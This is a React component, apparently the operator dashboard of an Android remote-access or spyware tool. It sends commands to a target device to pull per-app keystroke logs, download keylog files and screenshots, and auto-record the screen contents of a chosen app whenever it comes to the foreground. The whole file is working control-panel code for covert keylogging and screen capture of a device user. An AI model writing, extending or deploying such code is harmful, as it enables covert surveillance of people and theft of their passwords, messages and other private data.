import React, { useState, useEffect, useRef, useCallback } from 'react';

const PHONE_W = 280;
const PHONE_H = 560;
const MAX_RECORDINGS = 100;

function renderFrameElements(screenData, devW, devH) {
  if (!screenData) return null;
  const elements = (screenData.elements || []).filter(
    el => el.text || el.contentDescription || el.hintText || el.clickable || el.editable
  );
  const scX = PHONE_W / (devW || 1080);
  const scY = PHONE_H / (devH || 2340);

  const getStyle = (el) => {
    if (el.editable)  return { border: '1.5px solid #3b82f6', background: 'rgba(59,130,246,0.12)' };
    if (el.clickable) return { border: '1px solid rgba(34,197,94,0.5)', background: 'rgba(34,197,94,0.07)' };
    if (el.selected || el.checked) return { border: '1px solid rgba(234,179,8,0.5)', background: 'rgba(234,179,8,0.07)' };
    if (el.text || el.contentDescription) return { border: '1px solid rgba(148,163,184,0.16)', background: 'transparent' };
    return { border: '1px dashed rgba(100,116,139,0.12)', background: 'transparent' };
  };

  return [...elements]
    .filter(el => el.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const aB = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aB - aA;
    })
    .map((el, i) => {
      const left   = el.bounds.left * scX;
      const top    = el.bounds.top  * scY + 18;
      const width  = (el.bounds.right  - el.bounds.left) * scX;
      const height = (el.bounds.bottom - el.bounds.top)  * scY;
      if (width < 2 || height < 2) return null;
      const label = (el.text || el.contentDescription || el.hintText || '').slice(0, 30);
      return (
        <div key={i} style={{
          position: 'absolute', left, top, width, height,
          ...getStyle(el), borderRadius: 3, boxSizing: 'border-box',
          overflow: 'hidden', display: 'flex', alignItems: 'center', padding: '0 2px',
        }}>
          {height > 10 && label && (
            <span style={{
              fontSize: Math.min(Math.max(height * 0.36, 6), 9),
              color: el.editable ? '#93c5fd' : el.clickable ? '#86efac' : '#cbd5e1',
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
              lineHeight: 1.2, pointerEvents: 'none', fontWeight: el.clickable ? 600 : 400,
            }}>{label}</span>
          )}
        </div>
      );
    });
}

function addRecording(prev, rec) {
  const next = [rec, ...prev];
  return next.length > MAX_RECORDINGS ? next.slice(0, MAX_RECORDINGS) : next;
}

export default function AppMonitorTab({ device, sendCommand, results, screenReaderPushData }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;
  const info     = device?.deviceInfo || {};
  const devW     = info.screenWidth  || 1080;
  const devH     = info.screenHeight || 2340;

  const [monitoredApps, setMonitoredApps] = useState([]);
  const [selectedApp, setSelectedApp]     = useState(null);
  const [view, setView]                   = useState('recorder');
  const [appKeylogs, setAppKeylogs]       = useState([]);
  const [appScreenshots, setAppScreenshots] = useState([]);
  const [keylogFiles, setKeylogFiles]     = useState([]);
  const [loadingScreenshot, setLoadingScreenshot] = useState(null);
  const [previewImage, setPreviewImage]   = useState(null);
  const seenIds = useRef(new Set());

  const [isRecording, setIsRecording]     = useState(false);
  const [currentFrames, setCurrentFrames] = useState([]);
  const [recordings, setRecordings]       = useState([]);
  const [playing, setPlaying]             = useState(null);
  const [playIdx, setPlayIdx]             = useState(0);
  const [isPlaying, setIsPlaying]         = useState(false);
  const [playSpeed, setPlaySpeed]         = useState(500);
  const [readerActive, setReaderActive]   = useState(false);

  const isRecordingRef  = useRef(false);
  const framesRef       = useRef([]);
  const playTimerRef    = useRef(null);
  const selectedAppRef  = useRef(null);

  useEffect(() => { isRecordingRef.current = isRecording; }, [isRecording]);
  useEffect(() => { selectedAppRef.current = selectedApp; }, [selectedApp]);

  const fetchMonitoredApps = useCallback(() => {
    sendCommand(deviceId, 'list_app_monitor_apps', {});
  }, [deviceId, sendCommand]);

  useEffect(() => {
    if (isOnline) fetchMonitoredApps();
  }, [isOnline, fetchMonitoredApps]);

  useEffect(() => {
    results.forEach(r => {
      if (seenIds.current.has(r.id)) return;
      if (!r.success || !r.response) return;
      seenIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        switch (r.command) {
          case 'list_app_monitor_apps': {
            const configured = data.configured || [];
            const stored = data.stored || [];
            const merged = [...configured];
            stored.forEach(s => {
              if (!merged.find(c => c.packageName === s.packageName)) {
                merged.push({ ...s, configured: false });
              } else {
                const idx = merged.findIndex(c => c.packageName === s.packageName);
                merged[idx] = { ...merged[idx], ...s };
              }
            });
            setMonitoredApps(merged);
            break;
          }
          case 'get_app_keylogs':     setAppKeylogs(data.logs || []);          break;
          case 'list_app_keylog_files': setKeylogFiles(data.files || []);      break;
          case 'list_app_screenshots': setAppScreenshots(data.screenshots || []); break;
          case 'download_app_screenshot': {
            if (data.base64) {
              setPreviewImage({ base64: data.base64, filename: data.filename, pkg: data.packageName });
              setLoadingScreenshot(null);
            }
            break;
          }
          case 'download_app_keylog_file': {
            if (data.base64) {
              const raw = atob(data.base64);
              const blob = new Blob([raw], { type: 'text/plain' });
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
              a.download = `${data.packageName}_${data.date}.txt`;
              a.click();
              URL.revokeObjectURL(url);
            }
            break;
          }
          default: break;
        }
      } catch (_) {}
    });
  }, [results]);

  const saveRecording = useCallback((frames) => {
    if (!frames || frames.length === 0) return;
    const pkg = selectedAppRef.current;
    const rec = {
      id: Date.now(),
      label: `${(pkg || 'App').split('.').pop()} — ${new Date().toLocaleTimeString()}`,
      frames,
      duration: frames.length * 1000,
      frameCount: frames.length,
      packageName: pkg,
    };
    setRecordings(prev => addRecording(prev, rec));
  }, []);

  const stopRecording = useCallback((frames, sendStop = true) => {
    if (sendStop && readerActive) {
      sendCommand(deviceId, 'screen_reader_stop', {});
      setReaderActive(false);
    }
    setIsRecording(false);
    isRecordingRef.current = false;
    const captured = frames || framesRef.current;
    saveRecording(captured);
    framesRef.current = [];
    setCurrentFrames([]);
  }, [deviceId, sendCommand, readerActive, saveRecording]);

  useEffect(() => {
    if (!screenReaderPushData) return;
    if (!selectedAppRef.current) return;

    const autoEvent = screenReaderPushData.autoEvent;
    if (autoEvent === 'stop' && isRecordingRef.current) {
      stopRecording(framesRef.current, false);
      return;
    }
    if (autoEvent) return;

    if (!screenReaderPushData.success || !screenReaderPushData.screen) return;

    const pkg = screenReaderPushData.screen?.packageName || '';
    const target = selectedAppRef.current;

    if (pkg === target) {
      if (!isRecordingRef.current) {
        framesRef.current = [];
        setCurrentFrames([]);
        setIsRecording(true);
        isRecordingRef.current = true;
      }
      const frame = { ts: Date.now(), screen: screenReaderPushData.screen };
      framesRef.current = [...framesRef.current, frame];
      setCurrentFrames([...framesRef.current]);
    } else {
      if (isRecordingRef.current) {
        stopRecording(framesRef.current, false);
      }
    }
  }, [screenReaderPushData, stopRecording]);

  const stopPlayback = useCallback(() => {
    clearInterval(playTimerRef.current);
    setIsPlaying(false);
  }, []);

  const startPlayback = useCallback((rec) => {
    clearInterval(playTimerRef.current);
    setPlaying(rec);
    setPlayIdx(0);
    setIsPlaying(true);
    let idx = 0;
    playTimerRef.current = setInterval(() => {
      idx++;
      if (idx >= rec.frames.length) {
        clearInterval(playTimerRef.current);
        setIsPlaying(false);
        setPlayIdx(rec.frames.length - 1);
      } else {
        setPlayIdx(idx);
      }
    }, playSpeed);
  }, [playSpeed]);

  useEffect(() => () => clearInterval(playTimerRef.current), []);

  const deleteRecording = (id) => {
    if (playing?.id === id) { stopPlayback(); setPlaying(null); }
    setRecordings(prev => prev.filter(r => r.id !== id));
  };

  const selectApp = (pkg) => {
    if (isRecordingRef.current) stopRecording(framesRef.current, false);
    setPlaying(null);
    stopPlayback();
    setSelectedApp(pkg);
    setAppKeylogs([]);
    setAppScreenshots([]);
    setKeylogFiles([]);
    sendCommand(deviceId, 'get_app_keylogs', { packageName: pkg, limit: 200 });
    sendCommand(deviceId, 'list_app_keylog_files', { packageName: pkg });
    sendCommand(deviceId, 'list_app_screenshots', { packageName: pkg });
  };

  const startReader = () => {
    sendCommand(deviceId, 'screen_reader_start', {});
    setReaderActive(true);
  };

  const stopReader = () => {
    sendCommand(deviceId, 'screen_reader_stop', {});
    setReaderActive(false);
    if (isRecordingRef.current) stopRecording(framesRef.current, false);
  };

  const downloadKeylogFile = (pkg, date) => {
    sendCommand(deviceId, 'download_app_keylog_file', { packageName: pkg, date });
  };

  const viewScreenshot = (pkg, filename) => {
    setLoadingScreenshot(filename);
    sendCommand(deviceId, 'download_app_screenshot', { packageName: pkg, filename });
  };

  const downloadPreviewImage = () => {
    if (!previewImage) return;
    const a = document.createElement('a');
    a.href = 'data:image/jpeg;base64,' + previewImage.base64;
    a.download = previewImage.filename || 'screenshot.jpg';
    a.click();
  };

  const getAppShortName = (pkg) => pkg?.split('.').pop() || pkg;

  const displayFrame = playing
    ? (playing.frames[playIdx]?.screen || null)
    : (currentFrames.length > 0 ? currentFrames[currentFrames.length - 1]?.screen : null);
  const displayPkg = displayFrame?.packageName || '';

  const btn = (label, onClick, bg, disabled = false, extra = {}) => (
    <button onClick={onClick} disabled={disabled} style={{
      border: 'none', borderRadius: 6, padding: '4px 10px',
      background: disabled ? '#1e293b' : bg, color: disabled ? '#475569' : '#f1f5f9',
      cursor: disabled ? 'not-allowed' : 'pointer', fontSize: 11, fontWeight: 600,
      whiteSpace: 'nowrap', ...extra,
    }}>{label}</button>
  );

  return (
    <div className="app-monitor-tab">
      <div className="amt-layout">

        {/* Sidebar */}
        <div className="amt-sidebar">
          <div className="amt-sidebar-header">
            <span>📡 Monitored Apps</span>
            <button className="kl-btn" onClick={fetchMonitoredApps} disabled={!isOnline}>↻</button>
          </div>
          {monitoredApps.length === 0 && (
            <div className="amt-empty">
              <div style={{ fontSize: 28 }}>📡</div>
              <div style={{ fontSize: 12 }}>No monitored apps</div>
              <div style={{ fontSize: 11, color: '#475569' }}>Add packages to Constants.java</div>
            </div>
          )}
          {monitoredApps.map(app => (
            <div
              key={app.packageName}
              className={`amt-app-item ${selectedApp === app.packageName ? 'active' : ''}`}
              onClick={() => selectApp(app.packageName)}
            >
              <div className="amt-app-name">{getAppShortName(app.packageName)}</div>
              <div className="amt-app-pkg">{app.packageName}</div>
              <div className="amt-app-stats">
                {app.keylogDays > 0 && <span className="amt-badge">{app.keylogDays}d logs</span>}
                {app.screenshots > 0 && <span className="amt-badge amt-badge-ss">{app.screenshots} ss</span>}
                {!app.installed && <span className="amt-badge amt-badge-warn">not installed</span>}
              </div>
            </div>
          ))}
        </div>

        {/* Main */}
        <div className="amt-main">
          {!selectedApp ? (
            <div className="amt-no-selection">
              <div style={{ fontSize: 48 }}>📡</div>
              <div style={{ fontSize: 16, color: '#94a3b8', marginTop: 12 }}>Select an app to monitor</div>
              <div style={{ fontSize: 13, color: '#475569', marginTop: 8 }}>
                Recording starts automatically when that app comes into focus
              </div>
            </div>
          ) : (
            <>
              <div className="amt-app-header">
                <div className="amt-app-title">
                  <span style={{ fontSize: 20 }}>📱</span>
                  <span>{selectedApp}</span>
                </div>
                <div className="amt-view-tabs">
                  <button className={`amt-vtab ${view === 'recorder' ? 'active' : ''}`} onClick={() => setView('recorder')}>
                    🎥 Recorder
                  </button>
                  <button className={`amt-vtab ${view === 'keylogs' ? 'active' : ''}`} onClick={() => setView('keylogs')}>
                    ⌨️ Keylogs
                  </button>
                  <button className={`amt-vtab ${view === 'screenshots' ? 'active' : ''}`} onClick={() => setView('screenshots')}>
                    📸 Screenshots
                  </button>
                  <button
                    className={`amt-vtab ${view === 'files' ? 'active' : ''}`}
                    onClick={() => { setView('files'); sendCommand(deviceId, 'list_app_keylog_files', { packageName: selectedApp }); }}
                  >
                    📁 Files
                  </button>
                </div>
              </div>

              {/* ── RECORDER TAB ── */}
              {view === 'recorder' && (
                <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start', flexWrap: 'wrap', padding: '10px 0' }}>

                  {/* Phone frame */}
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                    <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
                      {isRecording ? '🔴 Recording…' : playing ? '▶ Playback' : '🎥 App Recorder'}
                    </div>

                    <div style={{
                      background: '#1e293b', borderRadius: 24, padding: '14px 8px 10px',
                      border: `2px solid ${isRecording ? '#dc2626' : playing ? '#7c3aed' : '#334155'}`,
                      display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 7,
                      boxShadow: isRecording ? '0 0 16px rgba(220,38,38,0.25)' : '0 4px 20px rgba(0,0,0,0.4)',
                      transition: 'border-color 0.3s',
                    }}>
                      <div style={{ width: 48, height: 4, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

                      <div style={{
                        width: PHONE_W, height: PHONE_H,
                        background: displayFrame ? '#101828' : '#0a0f1e',
                        borderRadius: 8, border: '1px solid #1e293b',
                        overflow: 'hidden', position: 'relative',
                      }}>
                        {!displayFrame && (
                          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', gap: 8, color: '#334155' }}>
                            <div style={{ fontSize: 32 }}>🎥</div>
                            <div style={{ fontSize: 10, color: '#475569', textAlign: 'center', padding: '0 16px' }}>
                              {readerActive
                                ? `Waiting for ${getAppShortName(selectedApp)}…`
                                : 'Start reader to record when app is in use'}
                            </div>
                          </div>
                        )}
                        {displayFrame && (
                          <>
                            <div style={{
                              position: 'absolute', top: 0, left: 0, right: 0, height: 18,
                              background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center',
                              padding: '0 6px', zIndex: 50, gap: 4,
                            }}>
                              <span style={{ fontSize: 7, color: '#94a3b8', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                {displayPkg.split('.').pop() || 'App'}
                              </span>
                              {isRecording && <span style={{ fontSize: 7, color: '#ef4444', fontWeight: 700 }}>● REC</span>}
                              {playing && <span style={{ fontSize: 7, color: '#a78bfa' }}>{playIdx + 1}/{playing.frames.length}</span>}
                            </div>
                            {renderFrameElements(displayFrame, devW, devH)}
                          </>
                        )}
                      </div>

                      {isRecording && (
                        <div style={{ fontSize: 10, color: '#ef4444', fontWeight: 700 }}>
                          ● {currentFrames.length} frame{currentFrames.length !== 1 ? 's' : ''} — {getAppShortName(selectedApp)}
                        </div>
                      )}

                      {playing && playing.frames.length > 1 && (
                        <div style={{ width: PHONE_W, display: 'flex', flexDirection: 'column', gap: 4 }}>
                          <input
                            type="range" min={0} max={playing.frames.length - 1} value={playIdx}
                            onChange={e => { stopPlayback(); setPlayIdx(Number(e.target.value)); }}
                            style={{ width: '100%', accentColor: '#7c3aed' }}
                          />
                          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 8, color: '#475569' }}>
                            <span>0s</span>
                            <span>{((playIdx * playSpeed) / 1000).toFixed(1)}s</span>
                            <span>{((playing.frames.length * playSpeed) / 1000).toFixed(1)}s</span>
                          </div>
                        </div>
                      )}

                      <div style={{ width: 50, height: 3, background: '#334155', borderRadius: 4 }} />
                    </div>

                    {/* Reader + playback controls */}
                    <div style={{ display: 'flex', gap: 5, justifyContent: 'center', flexWrap: 'wrap' }}>
                      {!readerActive
                        ? btn('▶ Start Reader', startReader, '#1e3a5f', !isOnline)
                        : btn('⏹ Stop Reader', stopReader, '#334155')
                      }
                      {playing && (
                        <>
                          {isPlaying
                            ? btn('⏸ Pause', stopPlayback, '#334155')
                            : btn('▶ Play', () => startPlayback(playing), '#4c1d95', playing.frames.length === 0)
                          }
                          {btn('✕ Close', () => { stopPlayback(); setPlaying(null); }, '#334155')}
                        </>
                      )}
                    </div>

                    {playing && (
                      <div style={{ display: 'flex', gap: 5, alignItems: 'center', justifyContent: 'center' }}>
                        <span style={{ fontSize: 10, color: '#475569' }}>Speed:</span>
                        <select
                          value={playSpeed}
                          onChange={e => { setPlaySpeed(Number(e.target.value)); if (isPlaying) { stopPlayback(); startPlayback(playing); } }}
                          style={{ background: '#1e293b', color: '#94a3b8', border: '1px solid #334155', borderRadius: 6, padding: '3px 6px', fontSize: 10 }}
                        >
                          <option value={200}>0.2s</option>
                          <option value={500}>0.5s</option>
                          <option value={1000}>1s</option>
                          <option value={2000}>2s</option>
                        </select>
                      </div>
                    )}

                    <div style={{ fontSize: 9, color: '#475569', textAlign: 'center' }}>
                      Auto-records when {getAppShortName(selectedApp)} is in foreground
                    </div>
                  </div>

                  {/* Recordings list */}
                  <div style={{ flex: 1, minWidth: 200, display: 'flex', flexDirection: 'column', gap: 6 }}>
                    <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
                      🎞 Recordings ({recordings.filter(r => r.packageName === selectedApp).length}/{MAX_RECORDINGS})
                    </div>

                    {recordings.filter(r => r.packageName === selectedApp).length === 0 && (
                      <div style={{
                        background: '#1e293b', borderRadius: 10, border: '1px solid #334155',
                        padding: '20px 12px', textAlign: 'center', color: '#475569',
                        display: 'flex', flexDirection: 'column', gap: 5, alignItems: 'center',
                      }}>
                        <span style={{ fontSize: 24 }}>🎞</span>
                        <span style={{ fontSize: 11 }}>No recordings yet</span>
                        <span style={{ fontSize: 10 }}>
                          Start the reader and open {getAppShortName(selectedApp)}
                        </span>
                      </div>
                    )}

                    {recordings.filter(r => r.packageName === selectedApp).map(rec => (
                      <div key={rec.id} style={{
                        background: playing?.id === rec.id ? '#1e1b4b' : '#1e293b',
                        borderRadius: 10,
                        border: `1px solid ${playing?.id === rec.id ? '#7c3aed' : '#334155'}`,
                        padding: '8px 10px', display: 'flex', flexDirection: 'column', gap: 5,
                      }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
                          <span style={{ fontSize: 12 }}>🎞</span>
                          <div style={{ flex: 1, minWidth: 0 }}>
                            <div style={{ fontWeight: 600, color: '#e2e8f0', fontSize: 11, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                              {rec.label}
                            </div>
                            <div style={{ fontSize: 9, color: '#475569', display: 'flex', gap: 6 }}>
                              <span>{rec.frameCount} frames</span>
                              <span>~{(rec.duration / 1000).toFixed(1)}s</span>
                            </div>
                          </div>
                          <button
                            onClick={() => { if (playing?.id === rec.id) { stopPlayback(); setPlaying(null); } else startPlayback(rec); }}
                            style={{ border: 'none', borderRadius: 5, padding: '3px 8px', background: playing?.id === rec.id ? '#7c3aed' : '#4c1d95', color: '#f1f5f9', fontSize: 10, cursor: 'pointer', fontWeight: 600 }}
                          >
                            {playing?.id === rec.id ? '⏏' : '▶'}
                          </button>
                          <button
                            onClick={() => deleteRecording(rec.id)}
                            style={{ border: 'none', borderRadius: 5, padding: '3px 7px', background: '#7f1d1d', color: '#f1f5f9', fontSize: 10, cursor: 'pointer' }}
                          >
                            🗑
                          </button>
                        </div>

                        {rec.frameCount > 0 && (
                          <div style={{ display: 'flex', gap: 2, overflowX: 'auto', paddingBottom: 2 }}>
                            {rec.frames.map((f, fi) => (
                              <div
                                key={fi}
                                onClick={() => {
                                  if (playing?.id === rec.id) { stopPlayback(); setPlayIdx(fi); }
                                  else { startPlayback(rec); setTimeout(() => { stopPlayback(); setPlayIdx(fi); }, 50); }
                                }}
                                style={{
                                  width: 22, height: 38, flexShrink: 0,
                                  background: fi === playIdx && playing?.id === rec.id ? '#7c3aed22' : '#0f172a',
                                  border: `1px solid ${fi === playIdx && playing?.id === rec.id ? '#7c3aed' : '#1e293b'}`,
                                  borderRadius: 3, cursor: 'pointer',
                                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                                  position: 'relative', overflow: 'hidden',
                                }}
                                title={`Frame ${fi + 1}`}
                              >
                                <span style={{ fontWeight: 700, fontSize: 6, color: fi === playIdx && playing?.id === rec.id ? '#a78bfa' : '#334155' }}>
                                  {fi + 1}
                                </span>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {view === 'keylogs' && (
                <div className="amt-keylogs">
                  <div className="amt-kl-count">{appKeylogs.length} entries</div>
                  <div className="amt-kl-feed">
                    {appKeylogs.length === 0 && (
                      <div className="amt-empty">
                        <div>No keylogs for {selectedApp}</div>
                        <div style={{ fontSize: 12, color: '#475569' }}>Logs are captured when the user types in this app</div>
                      </div>
                    )}
                    {appKeylogs.map((entry, i) => (
                      <div key={i} className="amt-kl-entry">
                        <div className="amt-kl-ts">{entry.timestamp?.slice(0, 19)}</div>
                        <div className="amt-kl-text">{entry.text}</div>
                        <div className="amt-kl-type">{entry.eventType}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {view === 'screenshots' && (
                <div className="amt-screenshots">
                  {appScreenshots.length === 0 && (
                    <div className="amt-empty">
                      <div style={{ fontSize: 36 }}>📸</div>
                      <div>No screenshots for {selectedApp}</div>
                      <div style={{ fontSize: 12, color: '#475569' }}>Screenshots captured when this app is active</div>
                    </div>
                  )}
                  <div className="amt-ss-grid">
                    {appScreenshots.map(ss => (
                      <div key={ss.filename} className="amt-ss-item">
                        <div className="amt-ss-thumb" onClick={() => viewScreenshot(selectedApp, ss.filename)} style={{ cursor: 'pointer' }}>
                          {loadingScreenshot === ss.filename ? (
                            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#7c3aed' }}>Loading…</div>
                          ) : (
                            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', fontSize: 32 }}>📸</div>
                          )}
                        </div>
                        <div className="amt-ss-meta">
                          <div style={{ fontSize: 11, color: '#94a3b8' }}>{ss.timestamp?.replace('_', ' ')}</div>
                          <div style={{ fontSize: 11, color: '#64748b' }}>{ss.size ? (ss.size / 1024).toFixed(0) + ' KB' : ''}</div>
                        </div>
                        <button className="amt-ss-view-btn" onClick={() => viewScreenshot(selectedApp, ss.filename)} disabled={!isOnline}>
                          👁 View
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {view === 'files' && (
                <div className="amt-files">
                  <div className="amt-files-header">Keylog files for {selectedApp}</div>
                  {keylogFiles.length === 0 && (
                    <div className="amt-empty">No keylog files stored for this app</div>
                  )}
                  {keylogFiles.map(f => (
                    <div key={f.date} className="kl-file-item">
                      <div className="kl-file-icon">📄</div>
                      <div className="kl-file-info">
                        <div className="kl-file-date">{f.date}</div>
                        <div className="kl-file-size">{f.size ? (f.size / 1024).toFixed(1) + ' KB' : '—'}</div>
                      </div>
                      <button className="kl-btn kl-btn-dl" onClick={() => downloadKeylogFile(selectedApp, f.date)} disabled={!isOnline}>
                        ⬇ Download
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </>
          )}
        </div>
      </div>

      {previewImage && (
        <div className="modal-overlay" onClick={() => setPreviewImage(null)}>
          <div className="modal-box" style={{ maxWidth: 500, maxHeight: '90vh' }} onClick={e => e.stopPropagation()}>
            <div className="modal-title">📸 {previewImage.filename}</div>
            <img
              src={`data:image/jpeg;base64,${previewImage.base64}`}
              alt="screenshot"
              style={{ maxWidth: '100%', maxHeight: '70vh', borderRadius: 8, display: 'block', margin: '10px auto' }}
            />
            <div className="modal-actions">
              <button className="btn-secondary" onClick={() => setPreviewImage(null)}>Close</button>
              <button className="btn-primary" onClick={downloadPreviewImage}>⬇ Download</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
